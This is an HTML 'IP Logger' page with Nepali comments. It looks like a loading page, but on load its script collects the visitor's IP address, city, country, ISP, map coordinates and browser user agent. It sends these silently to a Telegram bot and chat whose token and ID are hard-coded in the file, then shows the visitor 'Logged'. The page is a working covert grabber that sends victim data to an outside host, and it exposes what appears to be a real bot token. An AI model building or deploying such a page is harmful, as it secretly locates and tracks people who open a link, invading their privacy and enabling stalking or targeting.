<!DOCTYPE html>
<html>
<head>
    <title>IP Logger</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // 1. IP लिने
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                const ua = navigator.userAgent;

                // 2. Location लिने (ipinfo.io)
                fetch('https://ipinfo.io/' + ip + '/json')
                    .then(res => res.json())
                    .then(locData => {
                        let location = 'Location नआएको';
                        let mapLink = '';
                        let city = locData.city || '';
                        let country = locData.country || '';
                        let loc = locData.loc || ''; // "lat,lon"
                        let isp = locData.org || '';

                        if (city && country) {
                            location = country + ', ' + city + (isp ? ' (' + isp + ')' : '');
                        }
                        if (loc) {
                            const coords = loc.split(',');
                            mapLink = 'https://www.google.com/maps?q=' + coords[0] + ',' + coords[1];
                        }

                        // 3. Telegram Bot मा पठाउने (CORS bypass गर्न JSONP style)
                        const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
                        const chatId = '8621764137';
                        const msg = '📥 नयाँ क्लिक!\nIP: ' + ip +
                                    '\n📍 Location: ' + location +
                                    (mapLink ? '\n🗺️ Maps: ' + mapLink : '') +
                                    '\nUA: ' + ua;

                        // Telegram API मा POST request (CORS ले रोक्छ, तर try गरौं)
                        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: msg
                            })
                        })
                        .then(() => {
                            document.body.innerHTML = '<h2>✅ Logged</h2><p>IP: ' + ip + '</p><p>📍 ' + location + '</p>' + (mapLink ? '<p>🗺️ <a href="' + mapLink + '" target="_blank">Google Maps</a></p>' : '');
                        })
                        .catch(() => {
                            // CORS ले रोक्यो भने पनि IP र Location पेजमा देखाउने
                            document.body.innerHTML = '<h2>⚠️ Logged (Telegram मा पठाउन सकिएन)</h2><p>IP: ' + ip + '</p><p>📍 ' + location + '</p>' + (mapLink ? '<p>🗺️ <a href="' + mapLink + '" target="_blank">Google Maps</a></p>' : '<p>🔴 Telegram मा पठाउन CORS ले रोक्यो। तर IP र Location यहाँ छ।</p>');
                        });
                    })
                    .catch(() => {
                        document.body.innerHTML = '<h2>❌ Location fetch गर्न सकिएन</h2><p>IP: ' + ip + '</p>';
                    });
            })
            .catch(() => {
                document.body.innerHTML = '<h2>❌ IP detect गर्न सकिएन</h2>';
            });
    </script>
</body>
</html>
